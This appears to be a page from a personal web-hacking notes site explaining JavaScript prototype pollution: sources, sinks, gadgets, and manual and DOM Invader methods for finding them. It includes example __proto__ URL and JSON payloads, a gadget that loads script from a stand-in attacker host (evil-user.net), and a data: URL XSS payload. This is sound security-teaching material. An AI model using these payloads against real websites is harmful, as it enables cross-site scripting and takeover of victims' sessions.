---
title: Prototype Pollution
category: Web
order: 24
---

# What is Prototype Pollution?

Prototype pollution is a JavaScript vulnerability that enables an attacker to add arbitrary properties to global object prototypes, which may then be inherited by user-defined objects. 

Although prototype pollution is often unexploitable as a standalone vulnerability, it lets an attacker control properties of objects that would otherwise be inaccessible. If the application subsequently handles an attacker-controlled property in an unsafe way, this can potentially be chained with other vulnerabilities. In client-side JavaScript, this commonly leads to DOM XSS, while server-side prototype pollution can even result in remote code execution.

## Prototype pollution sources

A prototype pollution source is any user-controllable input that enables you to add arbitrary properties to prototype objects. The most common sources are as follows: 

### Prototype pollution via the URL

Consider the following URL, which contains an attacker-constructed query string: 

```
https://vulnerable-website.com/?__proto__[evilProperty]=payload
```
When breaking the query string down into `key:value` pairs, a URL parser may interpret `__proto__` as an arbitrary string.

```
targetObject.__proto__.evilProperty = 'payload';
```

In practice, injecting a property called `evilProperty` is unlikely to have any effect. However, an attacker can use the same technique to pollute the prototype with properties that are used by the application, or any imported libraries. 

### Prototype pollution via JSON input

User-controllable objects are often derived from a JSON string.

```
{
    "__proto__": {
        "evilProperty": "payload"
    }
}
```

If this is converted into a JavaScript object via the `JSON.parse()` method, the resulting object will in fact have a property with the key `__proto__`: 

```
const objectLiteral = {__proto__: {evilProperty: 'payload'}};
const objectFromJson = JSON.parse('{"__proto__": {"evilProperty": "payload"}}');

objectLiteral.hasOwnProperty('__proto__');     // false
objectFromJson.hasOwnProperty('__proto__');    // true
```

If the object created via `JSON.parse()` is subsequently merged into an existing object without proper key sanitization, this will also lead to prototype pollution 

## Prototype pollution sinks

A prototype pollution sink is essentially just a JavaScript function or DOM element that you're able to access via prototype pollution, which enables you to execute arbitrary JavaScript or system commands.

Check [DOM XSS](https://benjugat.github.io/hackingnotes/web/xss/) for more info about sinks.

As prototype pollution lets you control properties that would otherwise be inaccessible, this potentially enables you to reach a number of additional sinks within the target application.

## Prototype pollution gadgets

A gadget provides a means of turning the prototype pollution vulnerability into an actual exploit. This is any property that is: 

* Used by the application in an unsafe way, such as passing it to a sink without proper filtering or sanitization.
* Attacker-controllable via prototype pollution. The object must be able to inherit a malicious version of the property added to the prototype by an attacker.

A property cannot be a gadget if it is defined directly on the object itself. In this case, the object's own version of the property takes precedence over any malicious version you're able to add to the prototype. 

### Example of a prototype pollution gadget

Many JavaScript libraries accept an object that developers can use to set different configuration options. The library code checks whether the developer has explicitly added certain properties to this object and, if so, adjusts the configuration accordingly. If a property that represents a particular option is not present, a predefined default option is often used instead. A simplified example may look something like this: 

```
let transport_url = config.transport_url || defaults.transport_url;
```

Now imagine the library code uses this transport_url to add a script reference to the page: 

```
let script = document.createElement('script');
script.src = `${transport_url}/example.js`;
document.body.appendChild(script);
```

If the website's developers haven't set a `transport_url` property on their `config` object, this is a potential gadget. In cases where an attacker is able to pollute the global `Object.prototype` with their own `transport_url` property, this will be inherited by the `config` object and, therefore, set as the src for this script to a domain of the attacker's choosing. 

If the prototype can be polluted via a query parameter, for example, the attacker would simply have to induce a victim to visit a specially crafted URL to cause their browser to import a malicious JavaScript file from an attacker-controlled domain: 

```
https://vulnerable-website.com/?__proto__[transport_url]=//evil-user.net
```

By providing a `data:` URL, an attacker could also directly embed an XSS payload within the query string as follows:

```
https://vulnerable-website.com/?__proto__[transport_url]=data:,alert(1);//
```

# Client-side prototype pollution vulnerabilities

## Finding client-side prototype pollution sources manually

Finding prototype pollution sources manually is largely a case of trial and error. In short, you need to try different ways of adding an arbitrary property to `Object.prototype` until you find a source that works.

1. Try to inject an arbitrary property via the query string, URL fragment, and any JSON input.
```
 vulnerable-website.com/?__proto__[foo]=bar 
```
2. In our browser console, inspect `Object.prototype` to see if you have successfully polluted it with your arbitrary property:
```
Object.prototype.foo
// "bar" indicates that you have successfully polluted the prototype
// undefined indicates that the attack was not successful
```
3. If the property was not added to the prototype, try using different techniques, such as switching to dot notation rather than bracket notation, or vice versa:
```
vulnerable-website.com/?__proto__.foo=bar
```
4. Repeat this process for each potential source

![Proto](/hackingnotes/images/proto-manual-source.png)


## Finding client-side prototype pollution sources using DOM Invader

Finding prototype pollution sources manually can be a fairly tedious process. Instead, we recommend using DOM Invader, which comes preinstalled with Burp's built-in browser. DOM Invader is able to automatically test for prototype pollution sources as you browse, which can save you a considerable amount of time and effort. 

DOM Invader is disabled by default, enable it.

![DOM Invader](/hackingnotes/images/dom-invader.png)

![DOM Invader Source](/hackingnotes/images/dom-invader-source.png)

## Finding client-side prototype pollution gadgets manually

Once we have identified a source hat lets us to add arbitrary properties to the gobal `Object.prototype`, the next step is to find a suitable gadget that we can use to craft an exploit.

1. Look through the source code and identify any properties that are used by the application or any libraries that it imports.
2. Intercept the response (`Proxy -> Options -> Intercept server responses`). And intercept the response containing the javascript we want to test.
3. Add a `debugger` statement at the start of the script.
4. On the browser go to the page on which te script is loaded. The `debugger` statement pauses the execution of the script.
5. While the script is paused, switch to the console aand enter the following command replacing `YOUR-PROPERTY` with one of the properties that you think is a potential gadget.
```
Object.defineProperty(Object.prototype, 'YOUR-PROPERTY', {
    get() {
        console.trace();
        return 'polluted';
    }
})
```
6. Press the button to continue the execution of the script and monitor the console. If a stack trace appears, this confirms that the property was accessed somewhere within the application.
7. Expand the stack tracne and use the provided link to jump to the line of code where the property is being read.
8. Using the browser debugger controls, step through each phase of execution to see if the property is passed to a sink, such as `innerHTML` or `eval`.
9. Repeat this process for any properties that you think are potential gadgets.

## Finding client-side prototype pollution gadgets using DOM Invader

DOM Invader can automatically scan for gadgets on your behalf and can even generate a DOM XSS proof-of-concept in some cases. 

![DOM Invader Sink](/hackingnotes/images/dom-invader-sink.png)